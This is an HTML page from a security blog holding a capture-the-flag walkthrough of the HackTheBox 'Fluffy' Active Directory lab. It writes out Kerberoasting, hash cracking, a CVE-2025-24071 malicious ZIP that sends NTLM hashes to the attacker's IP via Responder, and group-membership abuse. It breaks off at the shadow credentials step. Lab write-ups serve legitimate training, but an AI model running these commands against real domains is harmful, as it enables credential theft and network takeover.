@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="HTB Fluffy - Complete Penetration Testing WalkthroughIntroductionThis is a comprehensive walkthrough and writeup for the HackTheBox (HTB) machine “Fluffy” - an Active Directory environment that demons">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Fluffy">
+<meta property="og:url" content="http://example.com/2025/10/17/HTB-Fluffy/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="HTB Fluffy - Complete Penetration Testing WalkthroughIntroductionThis is a comprehensive walkthrough and writeup for the HackTheBox (HTB) machine “Fluffy” - an Active Directory environment that demons">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/HTB-Fluffy/Null_Ses_Fluffy.png">
+<meta property="og:image" content="http://example.com/images/HTB-Fluffy/kerberoast-Fluffy.png">
+<meta property="og:image" content="http://example.com/images/HTB-Fluffy/shares-fluffy.png">
+<meta property="og:image" content="http://example.com/images/HTB-Fluffy/share-IT-fluffy.png">
+<meta property="og:image" content="http://example.com/images/HTB-Fluffy/Vuln-Report.png">
+<meta property="og:image" content="http://example.com/images/HTB-Fluffy/ntlm-hash-fluffy.png">
+<meta property="og:image" content="http://example.com/images/HTB-Fluffy/hachat-fluffy.png">
+<meta property="og:image" content="http://example.com/images/HTB-Fluffy/Bloodhoudn-Path-fluffy.png">
+<meta property="og:image" content="http://example.com/images/HTB-Fluffy/certipy_shadow-fluffy.png">
+<meta property="article:published_time" content="2025-10-16T21:00:00.000Z">
+<meta property="article:modified_time" content="2025-10-17T18:15:37.498Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/HTB-Fluffy/Null_Ses_Fluffy.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB-Fluffy</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/06/29/AWS-and-Sliver-C2-setup/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/10/17/HTB-Fluffy/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/10/17/HTB-Fluffy/&text=HTB-Fluffy"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/10/17/HTB-Fluffy/&title=HTB-Fluffy"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/10/17/HTB-Fluffy/&is_video=false&description=HTB-Fluffy"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-Fluffy&body=Check out this article: http://example.com/2025/10/17/HTB-Fluffy/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/10/17/HTB-Fluffy/&title=HTB-Fluffy"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/10/17/HTB-Fluffy/&title=HTB-Fluffy"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/10/17/HTB-Fluffy/&title=HTB-Fluffy"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/10/17/HTB-Fluffy/&title=HTB-Fluffy"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/10/17/HTB-Fluffy/&name=HTB-Fluffy&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/10/17/HTB-Fluffy/&t=HTB-Fluffy"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-Fluffy-Complete-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">HTB Fluffy - Complete Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Starting-Credentials"><span class="toc-number">1.2.1.</span> <span class="toc-text">Starting Credentials</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Port-Scanning"><span class="toc-number">1.2.2.</span> <span class="toc-text">Port Scanning</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration"><span class="toc-number">1.3.</span> <span class="toc-text">SMB Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Guest-Access-Discovery"><span class="toc-number">1.3.1.</span> <span class="toc-text">Guest Access Discovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SID-Brute-Force"><span class="toc-number">1.3.2.</span> <span class="toc-text">SID Brute Force</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting-Attack"><span class="toc-number">1.4.</span> <span class="toc-text">Kerberoasting Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Clock-Skew-Fix"><span class="toc-number">1.4.1.</span> <span class="toc-text">Clock Skew Fix</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-Service-Account-Hashes"><span class="toc-number">1.4.2.</span> <span class="toc-text">Extracting Service Account Hashes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash-Cracking-Attempt"><span class="toc-number">1.4.3.</span> <span class="toc-text">Hash Cracking Attempt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bloodhound-Enumeration"><span class="toc-number">1.5.</span> <span class="toc-text">Bloodhound Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Share-Exploration"><span class="toc-number">1.6.</span> <span class="toc-text">SMB Share Exploration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Share-Enumeration"><span class="toc-number">1.6.1.</span> <span class="toc-text">Share Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Accessing-the-IT-Share"><span class="toc-number">1.6.2.</span> <span class="toc-text">Accessing the IT Share</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2025-24071-Exploitation"><span class="toc-number">1.7.</span> <span class="toc-text">CVE-2025-24071 Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerability-Analysis"><span class="toc-number">1.7.1.</span> <span class="toc-text">Vulnerability Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Preparation"><span class="toc-number">1.7.2.</span> <span class="toc-text">Exploit Preparation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Hash-Capture"><span class="toc-number">1.7.3.</span> <span class="toc-text">NTLM Hash Capture</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash-Cracking"><span class="toc-number">1.7.4.</span> <span class="toc-text">Hash Cracking</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-via-Service-Accounts"><span class="toc-number">1.8.</span> <span class="toc-text">Privilege Escalation via Service Accounts</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bloodhound-Path-Analysis"><span class="toc-number">1.8.1.</span> <span class="toc-text">Bloodhound Path Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Adding-User-to-Service-Accounts-Group"><span class="toc-number">1.8.2.</span> <span class="toc-text">Adding User to Service Accounts Group</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shadow-Credentials-Attack"><span class="toc-number">1.8.3.</span> <span class="toc-text">Shadow Credentials Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Flag-Access"><span class="toc-number">1.8.4.</span> <span class="toc-text">User Flag Access</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Administrator-Privilege-Escalation"><span class="toc-number">1.9.</span> <span class="toc-text">Domain Administrator Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Certificate-Authority-Enumeration"><span class="toc-number">1.9.1.</span> <span class="toc-text">Certificate Authority Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC16-Exploitation"><span class="toc-number">1.9.2.</span> <span class="toc-text">ESC16 Exploitation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Domain-Administrator-Access"><span class="toc-number">1.9.3.</span> <span class="toc-text">Domain Administrator Access</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB-Fluffy
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-10-16T21:00:00.000Z" class="dt-published" itemprop="datePublished">2025-10-17</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/HTB/" rel="tag">HTB</a>, <a class="p-category" href="/tags/Linux/" rel="tag">Linux</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="HTB-Fluffy-Complete-Penetration-Testing-Walkthrough"><a href="#HTB-Fluffy-Complete-Penetration-Testing-Walkthrough" class="headerlink" title="HTB Fluffy - Complete Penetration Testing Walkthrough"></a>HTB Fluffy - Complete Penetration Testing Walkthrough</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This is a comprehensive walkthrough and writeup for the HackTheBox (HTB) machine “Fluffy” - an Active Directory environment that demonstrates real-world attack vectors including Kerberoasting, NTLM hash capture, certificate abuse (ESC16), and privilege escalation techniques. This writeup covers the complete penetration testing methodology from initial reconnaissance to domain administrator access.</p>
+<p><strong>Tools Used:</strong> Nmap, NetExec, Impacket, Bloodhound, Hashcat, Responder, BloodyAD, Certipy, Evil-WinRM</p>
+<p><strong>Difficulty:</strong> Easy</p>
+<p><strong>Key Techniques:</strong> Active Directory enumeration, Kerberoasting, CVE-2025-24071 exploitation, NTLM relay, certificate template abuse (ESC16), shadow credentials</p>
+<hr>
+<h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><h3 id="Starting-Credentials"><a href="#Starting-Credentials" class="headerlink" title="Starting Credentials"></a>Starting Credentials</h3><p>We begin with the following credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">j.fleischman / J0elTHEM4n1990!</span><br></pre></td></tr></table></figure>
+
+<h3 id="Port-Scanning"><a href="#Port-Scanning" class="headerlink" title="Port Scanning"></a>Port Scanning</h3><p>First, we perform a comprehensive port scan of the target:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -Pn -p- 10.129.232.88 -vvvv</span><br></pre></td></tr></table></figure>
+
+<p>For UDP scanning:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">udpx -t 10.129.232.88</span><br></pre></td></tr></table></figure>
+
+<p><strong>Scan Results:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON  VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-10-16 14:21:05Z)</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack Microsoft Windows Active </span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over </span><br><span class="line">3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.fluffy.htb.</span><br><span class="line">3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active </span><br><span class="line">5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49693/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49694/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49701/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49714/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49727/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-10-16T14:21:54</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 44288/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 10639/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 35164/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 32180/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br></pre></td></tr></table></figure>
+
+<p>The scan reveals a Windows Domain Controller running Active Directory services.</p>
+<hr>
+<h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><h3 id="Guest-Access-Discovery"><a href="#Guest-Access-Discovery" class="headerlink" title="Guest Access Discovery"></a>Guest Access Discovery</h3><p>We discovered that the guest user is enabled:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.129.232.88 -u &quot;guest&quot; -p &quot;&quot; --shares</span><br></pre></td></tr></table></figure>
+
+<h3 id="SID-Brute-Force"><a href="#SID-Brute-Force" class="headerlink" title="SID Brute Force"></a>SID Brute Force</h3><p>Using Impacket, we brute force the SIDs to enumerate users:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid -no-pass fluffy.htb/panos@DC01.fluffy.htb</span><br></pre></td></tr></table></figure>
+
+<p>Alternatively, using NetExec:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.129.232.88 -u &quot;panos&quot; -p &quot;&quot; --rid-brute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/HTB-Fluffy/Null_Ses_Fluffy.png" alt="Null session SID enumeration results"></p>
+<hr>
+<h2 id="Kerberoasting-Attack"><a href="#Kerberoasting-Attack" class="headerlink" title="Kerberoasting Attack"></a>Kerberoasting Attack</h2><h3 id="Clock-Skew-Fix"><a href="#Clock-Skew-Fix" class="headerlink" title="Clock Skew Fix"></a>Clock Skew Fix</h3><p>Before attempting Kerberoasting, we need to synchronize our clock with the domain controller:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ntpdate 10.129.232.88</span><br></pre></td></tr></table></figure>
+
+<h3 id="Extracting-Service-Account-Hashes"><a href="#Extracting-Service-Account-Hashes" class="headerlink" title="Extracting Service Account Hashes"></a>Extracting Service Account Hashes</h3><p>Using NetExec with our valid credentials to perform Kerberoasting (remember to add the FQDN to <code>/etc/hosts</code>):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap dc01.fluffy.htb -u j.fleischman -p &#x27;J0elTHEM4n1990!&#x27; --kerberoasting output.txt</span><br></pre></td></tr></table></figure>
+
+<p>We successfully retrieved three Kerberos TGS hashes for the following service accounts:</p>
+<ul>
+<li><code>ca_svc</code></li>
+<li><code>ldap_svc</code></li>
+<li><code>winrm_svc</code></li>
+</ul>
+<p><img src="/images/HTB-Fluffy/kerberoast-Fluffy.png" alt="Kerberoasting results showing three service account hashes"></p>
+<h3 id="Hash-Cracking-Attempt"><a href="#Hash-Cracking-Attempt" class="headerlink" title="Hash Cracking Attempt"></a>Hash Cracking Attempt</h3><p>We attempt to crack the hashes using Hashcat with mode 13100 (Kerberos TGS-REP):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>Unfortunately, none of the hashes cracked with the rockyou wordlist.</p>
+<hr>
+<h2 id="Bloodhound-Enumeration"><a href="#Bloodhound-Enumeration" class="headerlink" title="Bloodhound Enumeration"></a>Bloodhound Enumeration</h2><p>We run a Bloodhound ingestor to collect Active Directory data for analysis:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc ldap dc01.fluffy.htb -u j.fleischman -p &#x27;J0elTHEM4n1990!&#x27; --bloodhound --collection All --dns-server 10.129.232.88</span><br></pre></td></tr></table></figure>
+
+<p>After analyzing the Bloodhound data, we didn’t find any immediate privilege escalation paths for the user <code>j.fleischman</code>.</p>
+<hr>
+<h2 id="SMB-Share-Exploration"><a href="#SMB-Share-Exploration" class="headerlink" title="SMB Share Exploration"></a>SMB Share Exploration</h2><h3 id="Share-Enumeration"><a href="#Share-Enumeration" class="headerlink" title="Share Enumeration"></a>Share Enumeration</h3><p>We enumerate accessible SMB shares:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb dc01.fluffy.htb -u j.fleischman -p &#x27;J0elTHEM4n1990!&#x27; --shares</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/HTB-Fluffy/shares-fluffy.png" alt="SMB share enumeration showing the IT share with READ and WRITE permissions"></p>
+<p>We discovered an interesting share called <strong>IT</strong> with both READ and WRITE permissions. This is a goldmine for potential attacks.</p>
+<h3 id="Accessing-the-IT-Share"><a href="#Accessing-the-IT-Share" class="headerlink" title="Accessing the IT Share"></a>Accessing the IT Share</h3><p>We connect to the IT share using smbclient:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -U j.fleischman@fluffy.htb //fluffy.htb/IT</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/HTB-Fluffy/share-IT-fluffy.png" alt="Contents of the IT share showing a PDF file"></p>
+<p>We find a PDF file named <code>Upgrade_Notice.pdf</code>. Let’s download it:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get Upgrade_Notice.pdf</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="CVE-2025-24071-Exploitation"><a href="#CVE-2025-24071-Exploitation" class="headerlink" title="CVE-2025-24071 Exploitation"></a>CVE-2025-24071 Exploitation</h2><h3 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h3><p>Upon examining the PDF, we discover it contains a vulnerability report mentioning several CVEs, including <strong>CVE-2025-24071</strong>.</p>
+<p><img src="/images/HTB-Fluffy/Vuln-Report.png" alt="Vulnerability report showing CVE-2025-24071"></p>
+<p>After researching this CVE, we find a public proof-of-concept (POC) exploit available on GitHub.</p>
+<h3 id="Exploit-Preparation"><a href="#Exploit-Preparation" class="headerlink" title="Exploit Preparation"></a>Exploit Preparation</h3><p>Clone the exploit repository:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ThemeHackers/CVE-2025-24071.git</span><br></pre></td></tr></table></figure>
+
+<p>Install the required dependencies:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
+
+<p>Generate a malicious ZIP file that will capture NTLM hashes when opened:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -f malware.zip -i [Your IP Here]</span><br></pre></td></tr></table></figure>
+
+<h3 id="NTLM-Hash-Capture"><a href="#NTLM-Hash-Capture" class="headerlink" title="NTLM Hash Capture"></a>NTLM Hash Capture</h3><p>Start Responder to capture incoming NTLM authentication attempts:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0</span><br></pre></td></tr></table></figure>
+
+<p>Upload the malicious ZIP file to the IT share:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put exploit.zip</span><br></pre></td></tr></table></figure>
+
+<p>We wait for a user to interact with the file. Shortly after, Responder captures an NTLM hash!</p>
+<p><img src="/images/HTB-Fluffy/ntlm-hash-fluffy.png" alt="Responder capturing NTLM hash from user p.agila"></p>
+<h3 id="Hash-Cracking"><a href="#Hash-Cracking" class="headerlink" title="Hash Cracking"></a>Hash Cracking</h3><p>We crack the captured NTLMv2 hash using Hashcat:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/HTB-Fluffy/hachat-fluffy.png" alt="Hashcat successfully cracking the password"></p>
+<p><strong>Cracked Credentials:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.agila:prometheusx-303</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Privilege-Escalation-via-Service-Accounts"><a href="#Privilege-Escalation-via-Service-Accounts" class="headerlink" title="Privilege Escalation via Service Accounts"></a>Privilege Escalation via Service Accounts</h2><h3 id="Bloodhound-Path-Analysis"><a href="#Bloodhound-Path-Analysis" class="headerlink" title="Bloodhound Path Analysis"></a>Bloodhound Path Analysis</h3><p>With our new credentials, we return to Bloodhound and discover a clear privilege escalation path.</p>
+<p><img src="/images/HTB-Fluffy/Bloodhoudn-Path-fluffy.png" alt="Bloodhound showing path to domain compromise"></p>
+<p>The path shows that <code>p.agila</code> can add themselves to the <strong>Service Accounts</strong> group, which grants access to service account privileges.</p>
+<h3 id="Adding-User-to-Service-Accounts-Group"><a href="#Adding-User-to-Service-Accounts-Group" class="headerlink" title="Adding User to Service Accounts Group"></a>Adding User to Service Accounts Group</h3><p>Using BloodyAD, we add <code>p.agila</code> to the Service Accounts group:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD -u p.agila -p &#x27;prometheusx-303&#x27; -d fluffy.htb --host [IP] add groupMember &#x27;service accounts&#x27; p.agila</span><br></pre></td></tr></table></figure>
+
+<h3 id="Shadow-Credentials-Attack"><a href="#Shadow-Credentials-Attack" class="headerlink" title="Shadow Credentials Attack"></a>Shadow Credentials Attack</h3><p>Now that we’re in the Service Accounts group, we can use Certipy to perform a shadow credentials attack and extract NTLM hashes for service accounts.</p>
+<p>For the <code>winrm_svc</code> account:</p>
